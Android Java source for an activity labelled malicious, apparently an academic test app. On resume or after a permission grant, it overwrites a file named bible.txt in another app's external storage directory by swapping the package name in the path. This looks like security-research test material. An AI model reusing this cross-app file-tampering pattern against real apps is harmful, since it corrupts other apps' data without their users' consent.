package edu.ksu.cs.malicious;

import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class MalActivity extends AppCompatActivity {

    private static String TAG = "Malicious";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mal);
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (checkPermission("android.permission.READ_EXTERNAL_STORAGE", android.os.Process.myPid(), android.os.Process.myUid()) == PackageManager.PERMISSION_GRANTED) {
            Log.d("ExternalStorageBenign", "android.permission.READ_EXTERNAL_STORAGE already granted");
            File file = new File(getExternalFilesDir(null), "bible.txt");
            String absPath = file.getAbsolutePath();
            String myPath = absPath.replace("edu.ksu.cs.malicious", "edu.ksu.cs.benign");
            Log.d("ExternalStorageBenign", "Benign = " + file.getAbsolutePath());
            Log.d("ExternalStorageBenign", "Mal = " + myPath);
            try {
                InputStream is = getResources().openRawResource(R.raw.bible);
                OutputStream os = new FileOutputStream(new File(myPath));
                byte[] data = new byte[is.available()];
                is.read(data);
                os.write(data);
                is.close();
                os.close();
                Log.d("ExternalStorageBenign", myPath + " written successfully");
            } catch (IOException e) {
                e.printStackTrace();
                throw new RuntimeException(e);
            }
        } else {
            Log.d("ExternalStorageBenign", "need android.permission.READ_EXTERNAL_STORAGE permission");
            ActivityCompat.requestPermissions(this, new String[]{"android.permission.READ_EXTERNAL_STORAGE"}, 100);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == 100) {
            if (permissions[0].equalsIgnoreCase("android.permission.READ_EXTERNAL_STORAGE") &&
                    grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                File file = new File(getExternalFilesDir(null), "bible.txt");
                String absPath = file.getAbsolutePath();
                String myPath = absPath.replace("edu.ksu.cs.malicious", "edu.ksu.cs.benign");
                Log.d("ExternalStorageBenign", "Benign = " + file.getAbsolutePath());
                Log.d("ExternalStorageBenign", "Mal = " + myPath);
                try {
                    InputStream is = getResources().openRawResource(R.raw.bible);
                    OutputStream os = new FileOutputStream(new File(myPath));
                    byte[] data = new byte[is.available()];
                    is.read(data);
                    os.write(data);
                    is.close();
                    os.close();
                    Log.d("ExternalStorageBenign", myPath + " written successfully");
                } catch (IOException e) {
                    e.printStackTrace();
                    throw new RuntimeException(e);
                }
            }
        }
    }
}
